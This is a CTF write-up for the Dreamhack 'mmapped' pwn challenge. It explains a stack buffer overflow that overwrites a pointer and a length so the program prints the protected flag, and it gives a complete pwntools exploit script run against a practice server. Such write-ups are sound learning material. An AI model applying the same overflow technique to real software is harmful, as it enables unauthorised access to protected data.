+++
date = '2026-05-06'
draft = false
title = 'Dreamhack mmapped Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview
    
프로그램의 취약점을 찾고 익스플로잇하여 플래그를 출력하세요.

플래그는 ./flag 파일에 위치합니다.

플래그의 형식은 DH{...} 입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+10h] [rbp-40h] BYREF
  void *addr; // [rsp+38h] [rbp-18h]
  void *v6; // [rsp+40h] [rbp-10h]
  int v7; // [rsp+48h] [rbp-8h]
  int fd; // [rsp+4Ch] [rbp-4h]

  initialize(argc, argv, envp);
  fd = open("./flag", 0);
  v7 = 69;
  v6 = "DH{****************************************************************}";
  printf("fake flag address: %p\n", "DH{****************************************************************}");
  printf("buf address: %p\n", buf);
  addr = mmap(0, 0x45u, 1, 2, fd, 0);
  printf("real flag address (mmapped address): %p\n", addr);
  printf("%s", "input: ");
  read(0, buf, 0x3Cu);
  mprotect(addr, v7, 0);
  write(1, v6, 0x45u);
  printf("\nbuf value: ");
  puts(buf);
  munmap(addr, 0x45u);
  close(fd);
  return 0;
}
```

## Identifying the vulnerabilities

I had to look for 10 minutes, but I finally found what the `mprotect` values for prot are:

```c
#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE        0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed.  */
#define PROT_NONE        0x0                /* Page can not be accessed.  */
```

This reads 0x45 bytes from the flag file, and mmaps them. Then, `mprotect` sets `v7` bytes from `addr` to `PROT_NONE`; which is bad, it means we can't access that data at all.

But, that's not really a problem since we can overwrite `v7` (amount of bytes that `mprotect` will affect) to be null from `buf`. And, the stdout write, `write(1, v6, 69u);`, can be altered through `v6`, to print from `addr` instead. That's, of course, because they just print it out for us.

So, we have an action plan already! 

I quickly whipped up an exploit, and it worked first try. Isn't that great? Anyways, I connected remotely and got the flag as well.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/mmapped/chall')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:23358'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

p.recvuntil(b"): ")
mmapped = p.recvline().strip()
mmapped = int(mmapped, 16)

print(f"I correctly got {mmapped}!")

#we can only write 60 bytes in buf
buf = ( b"A"*40 +
        p64(mmapped) + #we can leave the address as it is
        p64(mmapped) + #make v6 point to real flag
        p32(0x0) #this is v7; remaining 4 bytes send 0
      )

p.recvuntil(b"input: ")
p.send(buf)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/mmapped.py)**.
